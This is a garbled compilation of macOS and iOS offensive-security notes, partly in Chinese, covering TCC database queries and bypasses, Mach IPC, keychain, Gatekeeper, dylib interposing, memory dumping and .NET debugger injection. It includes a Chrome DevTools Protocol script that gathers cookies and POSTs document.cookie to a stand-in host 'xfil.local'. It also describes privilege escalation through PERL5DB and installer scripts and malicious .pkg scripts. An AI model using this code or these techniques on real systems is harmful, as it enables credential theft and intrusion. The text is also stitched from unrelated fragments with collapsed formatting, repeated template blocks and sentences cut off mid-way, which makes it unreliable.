*)csInfo)[(__bridge NSString *)kSecCodeInfoStatus] intValue];const uint32_t cs_hard = 0x100; // don't load invalid page.const uint32_t cs_kill = 0x200; // Kill process if page is invalidconst uint32_t cs_restrict = 0x800; // Prevent debuggingconst uint32_t cs_require_lv = 0x2000; // Library Validationconst uint32_t cs_runtime = 0x10000; // hardened runtimeif ((csFlags & (cs_hard | cs_require_lv)) { return Yes; // Accept connection} # 工具与参考入口 vulnerable in certain situations # 检查清单 是否明确解析器和过滤器 是否从最小 payload 开始 是否验证编码 / 大小写 / 分隔符变体 是否记录可复现请求或样例 # 关联 漏洞利用与载荷总览 知识地图 # 扩展记录 可在这里补充实验环境、样例、检测规则、失败条件与版本差异。

This database is protected so only processes with high TCC privileges like Full Disk Access can write to it (but i't not protected by SIP). The previous databases are also TCC protected for read access. So you won't be able to read your regular user TCC database unless it's from a TCC privileged process. However, remember that a process with these high privileges (like FDA or kTCCServiceEndpointSecurityClient) will be able to write the users TCC database The SIP protected file /Users/carlospolop/Downloads/REG.db (also protected from read access with TCC), contains the location of all the valid TCC databases. The SIP protected file /Users/carlospolop/Downloads/MDMOverrides.plist (also protected from read access with TCC), contains more TCC granted permissions. The SIP protected file /Library/Apple/Library/Bundles/TCC Compatibility.bundle/Contents/Resources/AllowApplicationsList.plist (bu readable by anyone) is an allow list of applications that require a TCC exception. The csreq field is there to indicate how to verify the binary to execute and grant the TCC permissions: $HOME/.ssh, $HOME/.aws, etc Finder is an application that always has FDA (even if it doesn't appear in the UI), so if you have Automation privileges over it, you can abuse its privileges to make it do some actions.\ System Events can create Folder Actions, and Folder actions can access some TCC folders (Desktop, Documents & Downloads), so a script like the following one can be used to abuse this behaviour: kTCCServiceSystemPolicySysAdminFiles allows to change the NFSHomeDirectory attribute of a user that changes his home folder and therefore allows to 绕过 TCC. # 命令 / 载荷 / 操作片段 # 1. Basic Information 123ps -ef | grep tcc 0 374 1 0 Thu07PM ?? 2:01.66 /System/Library/PrivateFrameworks/TCC.framework/Support/tccd system 501 63079 1 0 6:59PM ?? 0:01.95 /System/Library/PrivateFrameworks/TCC.framework/Support/tccd # 2. Query the databases 1234567891011121314sqlite3 ~/Library/Application\ Support/com.apple.TCC/TCC.dbsqlite> .schema# Tables: admin, policies, active_policy, access, access_overrides, expired, active_policy_id# The table access contains the permissions per servicessqlite> select service, client, auth_value, auth_reason from access;kTCCServiceLiverpool|com.apple.syncdefaultsd|2|4kTCCServiceSystemPolicyDownloadsFolder|com.tinyspeck.slackmacgap|2|2kTCCServiceMicrophone|us.zoom.xos|2|2[...]# Check user approved permissions for telegramsqlite> select * from access where client LIKE "%telegram%" and auth_value=2;# Check user denied permissions for telegramsqlite> select * from access where client LIKE "%telegram%" and auth_value=0; # 3. Query the databases 1234567891011121314151617sqlite3 /Library/Application\ Support/com.apple.TCC/TCC.dbsqlite> .schema# Tables: admin, policies, active_policy, access, access_overrides, expired, active_policy_id# The table access contains the permissions per servicessqlite> select service, client, auth_value, auth_reason from access;kTCCServiceLiverpool|com.apple.syncdefaultsd|2|4kTCCServiceSystemPolicyDownloadsFolder|com.tinyspeck.slackmacgap|2|2kTCCServiceMicrophone|us.zoom.xos|2|2[...]# Get all FDAsqlite> select service, client, auth_value, auth_reason from access where service = "kTCCServiceSystemPolicyAllFiles" and auth_value=2;# Check user approved permissions for telegramsqlite> select * from access where client LIKE "%telegram%" and auth_value=2;# Check user denied permissions for telegramsqlite> select * from access where client LIKE "%telegram%" and auth_value=0; # 4. Therefore processes are just containers for running threads providing the memory, descriptors, ports, permissions... Processes can be inserted in groups to make it easier to handle them. For example, commands in a shell script will be in the same process group so it's possible to signal them together using kill for example.\ Each process with hold 凭据 that identify its privileges in the system. Each process will have one primary uid and one primary gid (although might belong to several groups).\ The syscall persona provides an alternate set of 凭据. Adopting a persona assumes its uid, gid and group memberships at one. In the source code it's possible to find the struct: Default Stack Size: The default stack size for new threads is 512 KB, which is sufficient for typical operations but can be adjusted via thread attributes if more or less space is needed. Thread Initialization: The pthread init() function is crucial during thread setup, utilizing the env[] argument to parse environment variables that can include details about the stack's location and size. Ensures that a piece of initialization code is executed only once. Its size is 12 bytes. Allows multiple readers or one writer at a time, facilitating efficient access to shared data. Read Write Lock (Signature: 0x52574c4b): Sized at 196 bytes. Read Write Lock Attributes (Signature: 0x52574c41): Attributes for read-write locks, 20 bytes in size. ** DATA. thread vars**: This section contains the metadata about the thread-local variables, like their types and initialization status. ** DATA. thread bss**: This section is used for thread-local variables that are not explicitly initialized. It's a part of memory set aside for zero-initialized data. renice is a command used to change the nice value of an already running process. This can be used to dynamically adjust the priority of processes, either increasing or decreasing their CPU time allocation based on new nice values. These tasks are long-running and typically show a progress indicator (e.g., downloading files, importing data). They are lower in priority than user-initiated tasks and do not need to finish immediately. # 命令 / 载荷 / 操作片段 # 1. 凭据 & Personae 1234567891011struct kpersona_info { uint32_t persona_info_version; uid_t persona_id; /* overlaps with UID */ int persona_type; gid_t persona_gid; uint32_t persona_ngroups; gid_t persona_groups[NGROUPS]; uid_t persona_gmuid; char persona_name[MAXLOGNAME + 1]; /* TODO: MAC policies?! */} # 2. Now export the env variable and execute the perl script: PERL5DB – when the interpreter is started with the -d (debugger) flag, the content of PERL5DB is executed as Perl code inside the debugger context. If you can influence both the environment and the command-line flags of a privileged Perl process you can do something like: PERL5SHELL – on Windows this variable controls which shell executable Perl will use when it needs to spawn a shell. It is mentioned here only for completeness, as it is not relevant on macOS. Although PERL5DB requires the -d switch, it is common to find maintenance or installer scripts that are executed as root with this flag enabled for verbose troubleshooting, making the variable a valid escalation vector. # 命令 / 载荷 / 操作片段 # 1. Services supporting VNC 认证 (2) are especially susceptible to brute force attacks due to the 8-character 密码 truncation. To enable ARD for various administrative tasks like 权限提升，GUI access, or user monitoring, use the following command: If you already have admin/root on the target and want to enable it: In practice, the abuse case is not limited to Finder. Any scriptable application that accepts the required Apple events becomes a remote attack surface, which makes RAE especially interesting after credential theft on internal macOS networks. Use a Strong 密码 and enforce the “VNC viewers may control screen with 密码” option disabled when possible. On macOS networks, Bonjour is frequently the easiest way to find remote administration surfaces without touching the target directly. Apple Remote Desktop itself can discover clients through Bonjour, so the same discovery data is useful to an attacker. mdns 侦察 – Python tool that scans entire ranges looking for misconfigured mDNS responders that answer unicast queries (useful to find devices reachable across subnets/WAN): Mitigation guidance # 命令 / 载荷 / 操作片段 # 1. Frida is especially useful because it works well for targeted extraction once you can attach to the process. Enumerate readable/writable ranges Minimal Frida example to dump all readable anonymous ranges: # 命令 / 载荷 / 操作片段 # 1. Dumping memory with osxpmem 12345#Dump raw formatsudo osxpmem.app/osxpmem --format raw -o /tmp/dump_mem#Dump aff4 formatsudo osxpmem.app/osxpmem -o /tmp/dump_mem.aff4 # 2. Dumping memory with osxpmem 1234sudo cp -r osxpmem.app/MacPmem.kext "/tmp/"sudo kextutil "/tmp/MacPmem.kext"#Allow the kext in "Security & Privacy --> General"sudo osxpmem.app/osxpmem --format raw -o /tmp/dump_mem # 3. Dumping memory with osxpmem 12sudo sucd /tmp; wget https://github.com/google/rekall/releases/download/v1.5.1/osxpmem-2.1.post4.zip; unzip osxpmem-2.1.post4.zip; chown -R root:wheel osxpmem.app/MacPmem.kext; kextload osxpmem.app/MacPmem.kext; osxpmem.app/osxpmem --format raw -o /tmp/dump_mem # 4. Live process dumping with LLDB 12sudo lldb --attach-pid <pid>(lldb) process save-core /tmp/target.core # 5. Live process dumping with LLDB 12sudo lldb --attach-pid <pid>(lldb) process save-core /tmp/target-full.core --style full # 6. Live process dumping with LLDB 12345678# Show loaded images and main binary(lldb) image list# Inspect mapped regions and permissions(lldb) memory region --all# Dump only one interesting range(lldb) memory read --force --outfile /tmp/region.bin --binary <start> <end> # 7. Selective dumps with Frida or userland readers 123456789Process.enumerateRanges({ protection: 'rw-', coalesce: true }).forEach(function (range) { try { if (range.file) return; var dump = range.base.readByteArray(range.size); var f = new File('/tmp/' + range.base + '.bin', 'wb'); f.write(dump); f.close(); } catch (e) {}}); # 工具与参考入口 osxpmem Rekall readmem https://www.appspector.com/blog/core-dump https://afine.com/to-allow-or-not-to-get-task-allow-that-is-the-question # 检查清单 是否明确解析器和过滤器 是否从最小 payload 开始 是否验证编码 / 大小写 / 分隔符变体 是否记录可复现请求或样例 # 关联 漏洞利用与载荷总览 知识地图 # 扩展记录 可在这里补充实验环境、样例、检测规则、失败条件与版本差异。

Example 123456789101112subsystem myipc 500; // Arbitrary name and iduserprefix USERPREF; // Prefix for created functions in the clientserverprefix SERVERPREF; // Prefix for created functions in the server#include <mach/mach_types.defs>#include <mach/std_types.defs>simpleroutine Subtract( server_port : mach_port_t; n1 : uint32_t; n2 : uint32_t); # 2. Example 1mig -header myipcUser.h -sheader myipcServer.h myipc.defs # 3. Example 12345678910111213/* Description of this subsystem, for use in direct RPC */const struct SERVERPREFmyipc_subsystem SERVERPREFmyipc_subsystem = { myipc_server_routine, 500, // start ID 501, // end ID (mach_msg_size_t)sizeof(union __ReplyUnion__SERVERPREFmyipc_subsystem), (vm_address_t)0, { { (mig_impl_routine_t) 0, // Function to call (mig_stub_routine_t) _XSubtract, 3, 0, (routine_arg_descriptor_t)0, (mach_msg_size_t)sizeof(__Reply__Subtract_t)}, }}; # 4. Example 12345678910/* Description of this subsystem, for use in direct RPC */extern const struct SERVERPREFmyipc_subsystem { mig_server_routine_t server; /* Server routine */ mach_msg_id_t start; /* Min routine number */ mach_msg_id_t end; /* Max routine number + 1 */ unsigned int maxsize; /* Max msg size */ vm_address_t reserved; /* Reserved */ struct routine_descriptor /* Array of routine descriptors */ routine[1];} SERVERPREFmyipc_subsystem; # 5. Example 123456789101112mig_external mig_routine_t myipc_server_routine (mach_msg_header_t *InHeadP){ int msgh_id; msgh_id = InHeadP->msgh_id - 500; if ((msgh_id > 0) || (msgh_id < 0)) return 0; return SERVERPREFmyipc_subsystem.routine[msgh_id].stub_routine;} # 6. Example 1234#ifndef subsystem_to_name_map_myipc#define subsystem_to_name_map_myipc \ { "Subtract", 500 }#endif # 7. Example 12345678910111213141516171819202122// gcc myipc_client.c myipcUser.c -o myipc_client#include <stdio.h>#include <stdlib.h>#include <unistd.h>#include <mach/mach.h>#include <servers/bootstrap.h>#include "myipcUser.h"int main() { // Lookup the receiver port using the bootstrap server. mach_port_t port; kern_return_t kr = bootstrap_look_up(bootstrap_port, "xyz.hacktricks.mig", &port); if (kr != KERN_SUCCESS) { printf("bootstrap_look_up() failed with code 0x%x\n", kr); return 1; } printf("Port right name %d\n", port); USERPREFSubtract(port, 40, 2);} # 8. jtool 1jtool2 -d __DATA.__const myipc_server | grep MIG # 9. jtool 1jtool2 -d __DATA.__const myipc_server | grep BL # 工具与参考入口 using this Hopper script *OS Internals, Volume I, User Mode, Jonathan Levin # 检查清单 是否明确解析器和过滤器 是否从最小 payload 开始 是否验证编码 / 大小写 / 分隔符变体 是否记录可复现请求或样例 # 关联 漏洞利用与载荷总览 知识地图 # 扩展记录 可在这里补充实验环境、样例、检测规则、失败条件与版本差异。

The System Keychain (/Library/Keychains/System.keychain), which stores system-wide 凭据 such as WiFi passwords, system root certificates, system private keys, and system application passwords. It's possible to find other components like certificates in /System/Library/Keychains/* In iOS there is only one Keychain located in /private/var/Keychains/. This folder also contains databases for the TrustStore, certificates authorities (caissuercache) and OSCP entries (ocspache). These files, while they do not have inherent protection and can be downloaded, are encrypted and require the user's plaintext 密码 to be decrypted. A tool like Chainbreaker could be used for decryption. ACLAuhtorizationExportWrapped: Allows the holder to get the clear text encrypted with another provided 密码. If the cdhash is indicated, then app must have the specific cdhash. content: 来源路径： 02-知识点/漏洞利用与载荷/macOS Kernel & System Extensions 技术笔记.md 自动导入：安全知识库笔记，已对示例密钥 / Token 做公开发布脱敏。 # macOS Kernel & System Extensions 技术笔记 [!summary] 提炼定位 面向 漏洞利用与载荷 的知识点；已剥离原仓库目录、构建说明、站点资产和安装噪声，只保留概念、流程、命令、工具、方法论与检测线索。 # 适用场景 快速查找 macOS Kernel & System Extensions 技术笔记 的利用思路、载荷形态或绕过技巧。 先明确目标解析器和约束，再逐步缩小有效 payload。 # 中文提炼 核心目标是把 macOS Kernel & System Extensions 技术笔记 抽象成解析器、过滤器、有效载荷和输出判断。 优先关注：macOS Kernel & System Extensions、XNU Kernel、Mach、BSD、I/O Kit：Drivers；payload 变体按编码、分隔符、大小写、协议、上下文逐个改变。 先证明最小触发，再扩大影响；把不可用变体也记录下来以便判断过滤边界。 防御视角补规范化、白名单、沙箱、最小权限、审计和异常响应。 本页当前以概念和流程为主；后续实验时可补充最小复现命令和输出样例。 # 关键主题 macOS Kernel & System Extensions XNU Kernel Mach BSD I/O Kit：Drivers Coprocessors in macOS Architecture IPC：Inter Process Communication macOS Kernel Extensions macOS System Extensions Cryptexes & RSR (Rapid Security Response) Rapid Security Response (RSR) # 核心要点 Attack surface: SEP firmware updates and the user-space daemons (seputil, securityd) that proxy requests. Impact of compromise: Leak long-term keys, 绕过 biometric gating, and break FileVault or Apple Pay protections. Attack surface: USB-C power delivery messages, fan/battery management interfaces, and firmware update paths. Attack surface: DFU/restore pathways, IPC endpoints exposed by services like tccd, and media pipelines bridged to the T2. Impact of compromise: Disable secure boot, decrypt SSD contents, hijack camera/mic gating, or emulate HID input for stealth 持久化. Display Coprocessor (DCP): Executes firmware at EL1 inside an isolated address space protected by DART (Apple’s IOMMU). Attack surface: DCPAVService interfaces, shared descriptor buffers, and firmware image parsing. Attack surface: Compiled model binaries (.ane), Core ML APIs feeding custom kernels, and firmware loaders. Attack surface: Metal shader compiler, shared buffer mapping APIs, and com.apple.AGXFirmware ioctl interfaces. Apple Video Encoder (AVE): Firmware executes on the Media Engine in an EL1-like sandbox. macOS interacts via VideoToolbox and AppleAVE2. Attack surface: Codec bitstreams, parameter sets, user-supplied buffers, and firmware update blobs. Impact of compromise: Leak uncompressed frames, 绕过 DRM, or gain code execution with access to DMA engines. Attack surface: Camera HALs, RAW frame descriptors, ISP configuration queues, and firmware updates. Attack surface: Kernel virtualization of AMX state (thread set state, context switches) and user-space code generation. # 工具与参考入口 https://opensource.apple.com/source/xnu/ The Mac Hacker's Handbook https://taomm.org/vol1/analysis.html # 检查清单 是否明确解析器和过滤器 是否从最小 payload 开始 是否验证编码 / 大小写 / 分隔符变体 是否记录可复现请求或样例 # 关联 漏洞利用与载荷总览 知识地图 # 扩展记录 可在这里补充实验环境、样例、检测规则、失败条件与版本差异。

If a pre or post installation script is for example executing from /var/tmp/Installerutil, and attacker could control that script so he escalate privileges whenever it's executed. Or another similar example: If an installer writes to /tmp/fixedname/bla/bla, it's possible to create a mount over /tmp/fixedname with noowners so you could modify any file during the installation to abuse the installation process. An example of this is CVE-2021-26089 which managed to overwrite a periodic script to get execution as root. For more information take a look to the talk: OBTS v4.0: "Mount(ain) of Bugs"：Csaba Fitzl It's possible to just generate a .pkg file with pre and post-install scripts without any real 载荷 apart from the malware inside the scripts. # 命令 / 载荷 / 操作片段 # 1. content: 来源路径： 02-知识点/漏洞利用与载荷/macOS IPC：Inter Process Communication 技术笔记.md 自动导入：安全知识库笔记，已对示例密钥 / Token 做公开发布脱敏。 # macOS IPC：Inter Process Communication 技术笔记 [!summary] 提炼定位 面向 漏洞利用与载荷 的知识点；已剥离原仓库目录、构建说明、站点资产和安装噪声，只保留概念、流程、命令、工具、方法论与检测线索。 # 适用场景 快速查找 macOS IPC：Inter Process Communication 技术笔记 的利用思路、载荷形态或绕过技巧。 先明确目标解析器和约束，再逐步缩小有效 payload。 # 中文提炼 核心目标是把 macOS IPC：Inter Process Communication 技术笔记 抽象成解析器、过滤器、有效载荷和输出判断。 优先关注：macOS IPC：Inter Process Communication、Mach messaging via Ports、Basic Information、Port Rights、File Ports；payload 变体按编码、分隔符、大小写、协议、上下文逐个改变。 先证明最小触发，再扩大影响；把不可用变体也记录下来以便判断过滤边界。 防御视角补规范化、白名单、沙箱、最小权限、审计和异常响应。 本页已沉淀 14 组命令 / 载荷片段；使用时先核对授权范围、目标环境和副作用。 # 关键主题 macOS IPC：Inter Process Communication Mach messaging via Ports Basic Information Port Rights File Ports Establishing a communication A Mach Message Complex Messages Mac Ports APIs Debug mach msg Enumerate ports Code example Privileged Ports Host Special Ports Task Special Ports Task Ports Thread Ports Shellcode Injection in thread via Task port # 核心要点 Mach uses tasks as the smallest unit for sharing resources, and each task can contain multiple threads. These tasks and threads are mapped 1:1 to POSIX processes and threads. As mentioned previously, it's possible to send rights using Mach messages, however, you cannot send a right without already having a right to send a Mach message. So, how is the first communication stablished? Note that mach messages are sent over a mach port, which is a single receiver, multiple sender communication channel built into the mach kernel. Multiple processes can send messages to a mach port, but at any point only a single process can read from it. It's also possible to send port rights to a vulnerable process, and the port rights will just appear in the process (even if he isn't handling them). mach msg | mach msg overwrite: Functions used to send and receive mach messages. The overwrite version allows to specify a different buffer for message reception (the other version will just reuse it). As the functions mach msg and mach msg overwrite are the ones used to send a receive messages, setting a breakpoint on them would allow to inspect the sent a received messages. thread #1, queue = 'com.apple.main-thread', stop reason = breakpoint 1.1 Host port: If a process has SEND privilege over this port he can get information about the system calling its routines like: Host Priv port: A process with SEND right over this port can perform privileged actions like showing boot data or trying to load a kernel extension. The process need to be root to get this permission. host priv statistics: Get privileged statistics TASK WIRED LEDGER PORT[ledger send right]: The port naming the source from which this task draws its wired kernel memory. TASK PAGED LEDGER PORT[ledger send right]: The port naming the source from which this task draws its default memory managed memory. task threads: Get SEND right over all task ports of the threads of the task thread create: Create a thread # 命令 / 载荷 / 操作片段 # 1. A Mach Message 12345678typedef struct { mach_msg_bits_t msgh_bits; mach_msg_size_t msgh_size; mach_port_t msgh_remote_port; mach_port_t msgh_local_port; mach_port_name_t msgh_voucher_port; mach_msg_id_t msgh_id;} mach_msg_header_t; # 2. A Mach Message 12345678910#define MACH_MSG_TYPE_MOVE_RECEIVE 16 /* Must hold receive right */#define MACH_MSG_TYPE_MOVE_SEND 17 /* Must hold send right(s) */#define MACH_MSG_TYPE_MOVE_SEND_ONCE 18 /* Must hold sendonce right */#define MACH_MSG_TYPE_COPY_SEND 19 /* Must hold send right(s) */#define MACH_MSG_TYPE_MAKE_SEND 20 /* Must hold receive right */#define MACH_MSG_TYPE_MAKE_SEND_ONCE 21 /* Must hold receive right */#define MACH_MSG_TYPE_COPY_RECEIVE 22 /* NOT VALID */#define MACH_MSG_TYPE_DISPOSE_RECEIVE 24 /* must hold receive right */#define MACH_MSG_TYPE_DISPOSE_SEND 25 /* must hold send right(s) */#define MACH_MSG_TYPE_DISPOSE_SEND_ONCE 26 /* must hold sendonce right */ # 3. Complex Messages 1234567891011121314#define MACH_MSG_PORT_DESCRIPTOR 0#define MACH_MSG_OOL_DESCRIPTOR 1#define MACH_MSG_OOL_PORTS_DESCRIPTOR 2#define MACH_MSG_OOL_VOLATILE_DESCRIPTOR 3#define MACH_MSG_GUARDED_PORT_DESCRIPTOR 4#pragma pack(push, 4)typedef struct{ natural_t pad1; mach_msg_size_t pad2; unsigned int pad3 : 24; mach_msg_descriptor_type_t type : 8;} mach_msg_type_descriptor_t; # 4. Debug mach msg 123456789__WATCHOS_PROHIBITED __TVOS_PROHIBITEDextern mach_msg_return_t mach_msg( mach_msg_header_t *msg, mach_msg_option_t option, mach_msg_size_t send_size, mach_msg_size_t rcv_size, mach_port_name_t rcv_name, mach_msg_timeout_t timeout, mach_port_name_t notify); # 5. Debug mach msg 12345678reg read $x0 $x1 $x2 $x3 $x4 $x5 $x6 x0 = 0x0000000124e04ce8 ;mach_msg_header_t (*msg) x1 = 0x0000000003114207 ;mach_msg_option_t (option) x2 = 0x0000000000000388 ;mach_msg_size_t (send_size) x3 = 0x0000000000000388 ;mach_msg_size_t (rcv_size) x4 = 0x0000000000001f03 ;mach_port_name_t (rcv_name) x5 = 0x0000000000000000 ;mach

When checking some malware sample you should always check the signature of the binary as the developer that signed it may be already related with malware. spctl is the CLI tool to enumerate and interact with Gatekeeper (with the syspolicyd daemon via XPC messages). For example, it's possible to see the status of GateKeeper with: GateKeeper will check if according to the preferences & the signature a binary can be executed: Note how the first rule ended in "App Store" and the second one in "Developer ID" and that in the previous imaged it was enabled to execute apps from the App Store and identified developers.\ These are hashes that from: The long‑standing Finder Ctrl+Open / Right‑click → Open 绕过 has been removed; users must explicitly allow a blocked app from System Settings → Privacy & Security → Open Anyway after the first block dialog. spctl --master-disable/--global-disable are no longer accepted; spctl is effectively read‑only for assessment and label management while policy enforcement is configured through UI or MDM. The presence of a quarantine flag signals macOS's Gatekeeper security feature when a user attempts to execute the file. security.mac.qtn.user approved exec: Querantined procs can only execute approved files A row in the provenance tracking table inside the ExecPolicy database at /var/db/SystemPolicyConfiguration/ExecPolicy/ storing the app’s cdhash and metadata. XProtect.bundle/Contents/Resources/LegacyEntitlementAllowlist.plist: Allows code with those cdhashes to use legacy entitlements. XProtect.bundle/Contents/Resources/XProtect.yara: Yara rules to detect malware. XProtect.bundle/Contents/Resources/gk.db: SQLite3 database with hashes of blocked applications and TeamIDs. # 命令 / 载荷 / 操作片段 # 1. It's a technology developed by Apple to optimize application support for concurrent (multithreaded) execution on multicore hardware. .main-thread: From dispatch get main queue() Notice that it will be the system who decides which threads handle which queues at each time (multiple threads might work in the same queue or the same thread might work in different queues at some point) pthread root queue:A queue with a pthread thread pool and not workqueues In Objetive-C there are different functions to send a block to be executed in parallel: dispatch once: Executes a block object only once for the lifetime of an application. dispatch async and wait: Submits a work item for execution and returns only after it finishes executing. Unlike dispatch sync, this function respects all attributes of the queue when it executes the block. let onceToken = DispatchOnce(); onceToken.perform { ... } # 命令 / 载荷 / 操作片段 # 1. This only affects calls that actually go through an import pointer. If the target function is called directly inside the same image, there is no imported slot to rewrite, so this technique won't see that call site. So when a function is called what is executed is the other one. In this case if the implementation code of the legit method verifies the method name it could detect this swizzling and prevent it from running. In this page different ways to hook functions were discussed. However, they involved running code inside the process to attack. In order to do that the easiest technique to use is to inject a Dyld via environment variables or hijacking. However, I guess this could also be done via Dylib process injection. # 命令 / 载荷 / 操作片段 # 1. Interpose printf 12345678910111213141516// gcc -dynamiclib interpose.c -o interpose.dylib#include <stdio.h>#include <stdarg.h>int my_printf(const char *format, ...) { //va_list args; //va_start(args, format); //int ret = vprintf(format, args); //va_end(args); int ret = printf("Hello from interpose
"); return ret;}__attribute__((used)) static struct { const void *replacement; const void *replacee; } _interpose_printf__attribute__ ((section ("__DATA,__interpose"))) = { (const void *)(unsigned long)&my_printf, (const void *)(unsigned long)&printf }; # 2. Interpose printf 1234567//gcc hello.c -o hello#include <stdio.h>int main() { printf("Hello World!
"); return 0;} # 3. Interpose printf 123456789101112131415161718192021// Just another way to define an interpose// gcc -dynamiclib interpose2.c -o interpose2.dylib#include <stdio.h>#define DYLD_INTERPOSE(_replacement, _replacee) \ __attribute__((used)) static struct { \ const void* replacement; \ const void* replacee; \ } _interpose_##_replacee __attribute__ ((section("__DATA, __interpose"))) = { \ (const void*) (unsigned long) &_replacement, \ (const void*) (unsigned long) &_replacee \ };int my_printf(const char *format, ...){ int ret = printf("Hello from interpose
"); return ret;}DYLD_INTERPOSE(my_printf,printf); # 4. Interpose printf 12345DYLD_INSERT_LIBRARIES=./interpose.dylib ./helloHello from interposeDYLD_INSERT_LIBRARIES=./interpose2.dylib ./helloHello from interpose # 5. Dynamic Interposing 123456struct dyld_interpose_tuple { const void* replacement; const void* replacee;};extern void dyld_dynamic_interpose(const struct mach_header* mh, const struct dyld_interpose_tuple array[], size_t count); # 6. Import Table Rebinding (fishhook-style) 1234567891011121314151617// clang -dynamiclib fishhook_demo.c fishhook.c -o fishhook_demo.dylib#include <stdio.h>#include <unistd.h>#include "fishhook.h"static int (*real_close)(int);int hooked_close(int fd) { fprintf(stderr, "[+] close(%d)
", fd); return real_close(fd);}__attribute__((constructor))static void install(void) { struct rebinding rb = {"close", hooked_close, (void *)&real_close}; rebind_symbols(&rb, 1);} # 7. Import Table Rebinding (fishhook-style) 1DYLD_INSERT_LIBRARIES=./fishhook_demo.dylib ./hello # 8. But you cannot delete/modify non-empty folders unless you have write permissions over it. execute：you are allowed to traverse the directory：if you don’t have this right, you can’t access any files inside it, or in any subdirectories. How to overwrite a file/folder owned by root, but: One parent directory owner in the path is a users group with write access A users group has write access to the file # 命令 / 载荷 / 操作片段 # 1. .fileloc 12345678910<?xml version="1.0" encoding="UTF-8"?><!DOCTYPE plist PUBLIC "-//Apple//DTD PLIST 1.0//EN" "http://www.apple.com/DTDs/PropertyList-1.0.dtd"><plist version="1.0"><dict> <key>URL</key> <string>file:///System/Applications/Calculator.app</string> <key>URLPrefix</key> <integer>0</integer></dict></plist> # 2. Keystroke/script injection: Runtime.evaluate executes arbitrary JavaScript inside the active tab, enabling credential lifting, DOM patching, or injecting 持久化 beacons that survive navigation. Silent cookie and credential theft with Network.getAllCookies/Fetch.getResponseBody. Modification of site permissions (camera, microphone, geolocation) and security interstitial 绕过，letting phishing pages impersonate Chrome dialogs. On-path tampering of TLS warnings, downloads, or WebAuthn prompts by programmatically driving Page.handleJavaScriptDialog, Page.setDownloadBehavior, or Security.handleCertificateError. https://github.com/breakpointHQ/snoop：Automates Chromium launches with 载荷 extensions and exposes interactive CDP hooks. # 命令 / 载荷 / 操作片段 # 1. Remote Debugging & DevTools Protocol Abuse 1234567891011import CDP from 'chrome-remote-interface';(async () => { const client = await CDP({host: '127.0.0.1', port: 9222}); const {Network, Runtime} = client; await Network.enable(); const {cookies} = await Network.getAllCookies(); console.log(cookies.map(c => `${c.domain}:${c.name}`)); await Runtime.evaluate({expression: "fetch('https://xfil.local', {method:'POST', body:document.cookie})"}); await client.close();})(); # 2. It executes workflows (.workflow bundles) composed of actions (.action bundles). Automator also powers Folder Actions, Quick Actions, and Shortcuts integration. Automator actions are plugins loaded into the Automator runtime when a workflow executes. They can: Execute arbitrary shell scripts Folder Actions automatically execute a workflow when files are added to a monitored folder: Folder Actions persist across reboots and execute silently. A Folder Action on ~/Downloads means every downloaded file triggers your 载荷 — including files from Safari, Chrome, AirDrop, and email attachments. Preference panes execute within the System Settings process, which may have elevated TCC permissions (accessibility, full disk access in some contexts) A malicious service captures data from 密码 managers, email clients, financial apps # 命令 / 载荷 / 操作片段 # 1. This header is then sent over to the target using the write syscall, followed by the sessionRequestData struct containing a GUID for the session: A read operation on the out pipe confirms the success or failure of the debugging session establishment: Once a debugging session is established, memory can be read using the MT ReadMemory message type. The function readMemory is detailed, performing the necessary steps to send a read request and retrieve the response: Similarly, memory can be written using the writeMemory function. The process involves setting the message type to MT WriteMemory, specifying the address and length of the data, and then sending the data: To execute code, one needs to identify a memory region with rwx permissions, which can be done using vmmap -pages: # 命令 / 载荷 / 操作片段 # 1. Establishing a Debugging Session <a href="#net-core-debugging" id="net-core-debugging"></a> 1read(rd, &sReceiveHeader, sizeof(MessageHeader)); # 5. Reading Memory 123456789bool readMemory(void *addr, int len, unsigned char **output) {// Allocation and initialization...// Write header and read response...// Read the memory from the debuggee...return true;} # 6. Writing Memory 123456789bool writeMemory(void *addr, int len, unsigned char *input) {// Increment IDs, set message type, and specify memory location...// Write header and data, then read the response...// Confirm memory write was successful...return true;} # 7. .NET Core Code Execution <a href="#net-core-code-execution" id="net-core-code-execution"></a> 12vmmap -pages [pid]vmmap -pages 35829 | grep "rwx/rwx" # 工具与参考入口 https://blog.xpnsec.com/macos-injection-via-third-party-frameworks/ dbgtransportsession.cpp dbgtransportsession.cpp#L127 twowaypipe.cpp#L27 DbgTransportSession::TransportWorker MT ReadMemory here here jithelpers.h here # 检查清单 是否明确解析器和过滤器 是否从最小 payload 开始 是否验证编码 / 大小写 / 分隔符变体 是否记录可复现请求或样例 # 关联 漏洞利用与载荷总览 知识地图 # 扩展记录 可在这里补充实验环境、样例、检测规则、失败条件与版本差异。

It can be used to 下载 other components such as simulators and different SDK versions required to build and test your app.\ It's highly recommended to 下载 Xcode from the official app store. Other versions may be carrying malware. In contrast, iOS devices cannot flash custom ROMs due to the bootloader's restriction to only boot Apple-signed images. Jailbreaking iOS aims to 绕过 Apple's code signing protections to run unsigned code, a process complicated by Apple's continuous security enhancements. This has a direct impact on environment validation, Frida setup, and jailbreak 检测 绕过: When reviewing jailbreak 检测 logic in an app, remember that modern checks often look for rootless artifacts and symlinks in addition to classic indicators like Cydia.app. Several applications will try to detect if the mobile is jailbroken and in that case the application won't run In a jailbroken device applications get read/write access to new files outside the sandbox More information about how to detect jailbreaking here**.** You can try to avoid this detections using objection's ios jailbreak disable # 命令 / 载荷 / 操作片段 # 1. content: 来源路径： 02-知识点/漏洞利用与载荷/iOS Pentesting without Jailbreak 技术笔记.md 自动导入：安全知识库笔记，已对示例密钥 / Token 做公开发布脱敏。 # iOS Pentesting without Jailbreak 技术笔记 [!summary] 提炼定位 面向 漏洞利用与载荷 的知识点；已剥离原仓库目录、构建说明、站点资产和安装噪声，只保留概念、流程、命令、工具、方法论与检测线索。 # 适用场景 快速查找 iOS Pentesting without Jailbreak 技术笔记 的利用思路、载荷形态或绕过技巧。 先明确目标解析器和约束，再逐步缩小有效 payload。 # 中文提炼 核心目标是把 iOS Pentesting without Jailbreak 技术笔记 抽象成解析器、过滤器、有效载荷和输出判断。 优先关注：iOS Pentesting without Jailbreak、Main idea、Obtain decrypted IPA、Get it from Apple、Decrypting the app；payload 变体按编码、分隔符、大小写、协议、上下文逐个改变。 先证明最小触发，再扩大影响；把不可用变体也记录下来以便判断过滤边界。 防御视角补规范化、白名单、沙箱、最小权限、审计和异常响应。 本页已沉淀 11 组命令 / 载荷片段；使用时先核对授权范围、目标环境和副作用。 # 关键主题 iOS Pentesting without Jailbreak Main idea Obtain decrypted IPA Get it from Apple Decrypting the app Patch entitlements & re-sign IPA patching + 